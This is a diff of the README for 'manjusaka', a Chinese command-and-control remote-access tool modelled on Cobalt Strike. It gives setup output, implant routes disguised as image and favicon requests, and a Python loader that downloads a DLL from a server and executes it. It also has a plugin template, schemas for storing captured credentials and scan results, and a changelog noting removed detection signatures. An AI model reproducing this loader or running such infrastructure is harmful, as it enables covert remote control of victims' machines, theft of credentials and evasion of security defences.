@@ -13,24 +13,150 @@
 # manjusaka
 牛屎花  一款基于WEB界面的仿CobaltStrike C2远控 
 
-##系统架构： ![164759109](https://user-images.githubusercontent.com/46884495/159195361-cc3b75f1-ab5e-425b-a3b3-65d65878c048.jpg)
-
-##操作截图：
-
-![微信截图_20220406181015](https://user-images.githubusercontent.com/46884495/161952357-d9a86804-0b52-4866-b1f9-2148746f744d.png)
-
-![微信截图_20220318162038](https://user-images.githubusercontent.com/46884495/159195383-348e6fb1-3516-40be-9522-5c562e626d36.png)
-
-![微信截图_20220318162241](https://user-images.githubusercontent.com/46884495/159195398-bf7b2cd1-cbae-4d23-a101-fc8311c24949.png)
-
-![微信截图_20220406180114](https://user-images.githubusercontent.com/46884495/161950618-aadf6240-5672-4756-b103-f8be08f55747.png)
+##系统架构： ![](./images/1.jpg)
 
 ## 使用方法
- ./manjusaka -h 
+```bash
+[root@devops nps]# ./manjusaka
+[NPS] 2022/09/14 15:57:21 初始用户: manjusaka  密码: ZbFCa2L2LRd5
+[NPS] 2022/09/14 15:57:21 创建项目: 公共项目 没有归属的npc放在这个项目里面
+[NPS] 2022/09/14 15:57:21 监听项目路由: VHOS5vqN
+[NPS] 2022/09/14 15:57:21 NPS监听地址 :3200
+[NPS] 2022/09/14 15:57:21 NPU后台地址 : manjusaka
+[NPS] 2022/09/14 15:57:21 NPC监听地址 :801
+[NPS] 2022/09/14 15:57:21 NPC交互路由 : /:target/favicon.ico
+[NPS] 2022/09/14 15:57:21 NPC下载路由 : /:target/assert/:sys/bg.jpg
+[NPS] 2022/09/14 15:57:21 NPC文件路由 : /images/:fid/logo.png
+```
+则NPS访问地址为  http://192.168.93.217:3200/manjusaka 
+
+
+1、创建项目，默认有一个公共项目，选择当前项目后 可在回传结果里面查看当前项目回传的信息
+
+![](./images/1.jpg)
+
+
+2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc
  
- 默认 ./manjusaka -h vpsip
+```python
+import requests
+from ctypes import cdll
+
+res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/bg.jpg")
+with open("a.dll","wb") as f:
+    f.write(res.content)
+
+dll = cdll.LoadLibrary("a.dll")
+dll.main()
+
+```
+
+
+![](./images/2.jpg)
+
+3、npc上线，点选中该npc即可对其进行操作
+
+![](./images/3.jpg)
+
+![](./images/4.jpg)
+
+![](./images/5.jpg)
+
+![](./images/6.jpg)
+
+![](./images/7.jpg)
+
+![](./images/8.jpg)
+
+
+4、插件系统 生成dll/so插件, 以plug_name_nps.dll格式命名放到plugins文件夹下面 即可动态调用
+插件开发示例, main传入插件运行参数 传出返回的内容值 
+```rust
+/* 
+//./Cargo.toml
+[lib]
+path = "src/lib.rs"
+crate-type = ["cdylib"]
+*/
+
+//src/lib.rs
+
+use std::ffi::CStr;
+use std::ffi::CString;
+use std::os::raw::c_char;
+
+#[no_mangle]
+pub unsafe extern "C" fn main(args: *const c_char) -> *const c_char { 
+    let r_str = CStr::from_ptr(args).to_str().unwrap();
+
+    println!("plugin load args: {}", r_str);
+    let c_str = format!("plugin return {}",r_str);
+
+    CString::new(c_str).expect("CString failed").into_raw()
+}
+
+```
+返回值匹配到如下protobuf格式后后将结果写入数据库
+
+```protobuf
+syntax = "proto3";
+
+message PassResult{
+    string username = 1;
+    string password = 2;
+    string passtype = 3;
+    string passfrom = 4;
+}
+
+message PassScan{
+    string hosts = 1;
+    string ports = 2;
+    string args = 3;
+    repeated PortResult result = 4;
+}
+
+message PortResult{
+    string host = 1;
+    string port = 2;
+    string proto = 3;
+    string version = 4;
+}
+message PortScan{
+    string hosts = 1;
+    string ports = 2;
+    string args = 3;
+    repeated PortResult result = 4;
+}
+message HttpResult{
+    string proto = 1;
+    string host = 2;
+    string port = 3;
+    string title = 4;
+    string note = 5;
+}
+message HttpScan{
+    string hosts = 1;
+    string ports = 2;
+    string args = 3;
+    repeated PortResult result = 4;
+}
+
+```
+
  
 ## 更新
+
+### v0.5
+1、修复安全漏洞
+
+2、开放NPC配置修改功能
+
+3、上传文件流程优化
+
+4、增加动态插件功能，可拓展更多功能 
+
+5、去除特征、修复bug 
+
 
 ### v0.4
 1、随机key 
@@ -58,3 +184,5 @@
 1、实现基础远控功能。
 
 
+## 交流
+https://discord.gg/YMqeN5Qyk4
